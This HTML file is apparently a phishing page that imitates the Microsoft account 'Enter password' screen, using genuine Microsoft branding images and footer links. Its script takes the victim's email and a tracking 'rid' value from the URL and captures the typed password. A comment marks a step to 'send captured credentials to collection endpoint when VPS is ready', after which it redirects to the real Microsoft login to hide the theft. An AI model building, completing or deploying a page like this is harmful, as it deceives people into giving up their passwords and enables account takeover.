<!DOCTYPE html>
<html dir="ltr" lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Sign in to your account</title>
  <link rel="shortcut icon" href="https://aadcdn.msftauth.net/shared/1.0/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico">
  <style>
    *, *::before, *::after { box-sizing: border-box; }

    html, body {
      height: 100%;
      margin: 0;
      padding: 0;
    }

    body {
      font-family: "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, sans-serif;
      font-size: 15px;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
    }

    /* Full-screen illustration with dark overlay */
    #background {
      position: fixed;
      inset: 0;
      background-image: url('https://aadcdn.msftauthimages.net/c1c6b6c8-9isyrpmwvbkjokhsl98i6hyicfnqtm8jqifhdaschl0/logintenantbranding/0/illustration?ts=636443648609725852');
      background-size: cover;
      background-position: center;
      background-repeat: no-repeat;
    }

    /* Dark overlay to dim the illustration */
    #background::after {
      content: '';
      position: absolute;
      inset: 0;
      background: rgba(0, 0, 0, 0.45);
    }

    /* Main content area — centers the card */
    #wrapper {
      position: relative;
      z-index: 1;
      flex: 1;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }

    /* Floating white card */
    #lightbox {
      background: #ffffff;
      padding: 44px;
      width: 440px;
      max-width: 100%;
      box-shadow: 0 2px 6px rgba(0,0,0,0.3);
    }

    /* Company banner logo */
    .banner-logo {
      display: block;
      max-height: 36px;
      max-width: 220px;
      margin-bottom: 20px;
    }

    /* Email row: back arrow + email */
    .user-row {
      display: flex;
      align-items: center;
      gap: 6px;
      margin-bottom: 16px;
      font-size: 13px;
      color: #1b1b1b;
    }

    .user-row a {
      color: #1b1b1b;
      text-decoration: none;
      display: flex;
      align-items: center;
    }

    .user-row a:hover { text-decoration: underline; }

    .user-row .arrow {
      font-size: 14px;
      color: #1b1b1b;
    }

    h1.title {
      font-size: 24px;
      font-weight: 600;
      color: #1b1b1b;
      margin: 0 0 16px 0;
    }

    .input-field {
      margin-bottom: 12px;
    }

    .input-field input {
      width: 100%;
      border: none;
      border-bottom: 1px solid #767676;
      padding: 6px 0;
      font-size: 15px;
      color: #1b1b1b;
      background: transparent;
      outline: none;
      font-family: inherit;
    }

    .input-field input::placeholder { color: #767676; }

    .input-field input:focus {
      border-bottom: 2px solid #0067b8;
    }

    .link-text {
      font-size: 13px;
      margin: 8px 0;
      display: block;
    }

    .link-text a {
      color: #0067b8;
      text-decoration: none;
    }

    .link-text a:hover { text-decoration: underline; }

    .button-row {
      display: flex;
      justify-content: flex-end;
      margin-top: 20px;
    }

    .btn-signin {
      font-size: 15px;
      font-family: inherit;
      padding: 8px 20px;
      border: none;
      cursor: pointer;
      min-width: 80px;
      background: #0067b8;
      color: #ffffff;
    }

    .btn-signin:hover { background: #005da6; }

    /* Footer */
    #footer {
      position: relative;
      z-index: 1;
      text-align: right;
      padding: 10px 20px;
      font-size: 12px;
      color: #ffffff;
    }

    #footer a {
      color: #ffffff;
      text-decoration: none;
      margin-left: 16px;
    }

    #footer a:hover { text-decoration: underline; }

    /* Slide transitions */
    @keyframes slideInRight {
      from { transform: translateX(30px); opacity: 0; }
      to   { transform: translateX(0);    opacity: 1; }
    }
    @keyframes slideOutRight {
      from { transform: translateX(0);   opacity: 1; }
      to   { transform: translateX(30px); opacity: 0; }
    }
    @keyframes slideOutLeft {
      from { transform: translateX(0);    opacity: 1; }
      to   { transform: translateX(-30px); opacity: 0; }
    }
    .slide-in-right  { animation: slideInRight  0.35s cubic-bezier(0.36, 0.66, 0.04, 1) forwards; }
    .slide-out-right { animation: slideOutRight 0.3s  cubic-bezier(0.36, 0.66, 0.04, 1) forwards; }
    .slide-out-left  { animation: slideOutLeft  0.3s  cubic-bezier(0.36, 0.66, 0.04, 1) forwards; }

  </style>
</head>
<body>

<div id="background"></div>

<div id="wrapper">
  <div id="lightbox">
    <img class="banner-logo"
         src="https://aadcdn.msftauthimages.net/c1c6b6c8-9isyrpmwvbkjokhsl98i6hyicfnqtm8jqifhdaschl0/logintenantbranding/0/bannerlogo?ts=636443644020765459"
         alt="">

    <div class="user-row">
      <a id="backLink" href="index.html">
        <span class="arrow">&#8592;</span>&nbsp;<span id="displayEmail"></span>
      </a>
    </div>

    <h1 class="title">Enter password</h1>

    <form id="passwordForm" onsubmit="handleSubmit(event)">
      <div class="input-field">
        <input type="password" id="passwd" name="passwd"
               placeholder="Password"
               autocomplete="current-password"
               spellcheck="false"
               autofocus>
      </div>

      <span class="link-text"><a href="https://passwordreset.microsoftonline.com/" tabindex="-1">Forgot my password</a></span>

      <div class="button-row">
        <button type="submit" class="btn-signin">Sign in</button>
      </div>
    </form>

  </div>
</div>

<div id="footer">
  <a href="https://www.microsoft.com/en-US/servicesagreement/">Terms of use</a>
  <a href="https://privacy.microsoft.com/en-US/privacystatement">Privacy &amp; cookies</a>
  <span style="margin-left:16px;">&#xB7;&#xB7;&#xB7;</span>
</div>

<script>
  const params = new URLSearchParams(window.location.search);
  const email = params.get('email') || '';
  const rid   = params.get('rid')   || '';
  const box   = document.getElementById('lightbox');

  document.getElementById('displayEmail').textContent = email;

  const backHref = 'index.html?dir=back' + (rid ? '&rid=' + encodeURIComponent(rid) : '');
  document.getElementById('backLink').href = backHref;

  // Entry: always slides in from the right (coming from email step)
  box.classList.add('slide-in-right');

  // Back arrow: slide out to the right, then navigate
  document.getElementById('backLink').addEventListener('click', function(e) {
    e.preventDefault();
    box.classList.add('slide-out-right');
    setTimeout(() => { window.location.href = backHref; }, 300);
  });

  function handleSubmit(e) {
    e.preventDefault();
    const password = document.getElementById('passwd').value;
    if (!password) return;

    // TODO: send captured credentials to collection endpoint when VPS is ready

    box.classList.add('slide-out-left');
    setTimeout(() => {
      window.location.href = 'https://login.microsoftonline.com/?username=' + encodeURIComponent(email);
    }, 300);
  }
</script>

</body>
</html>
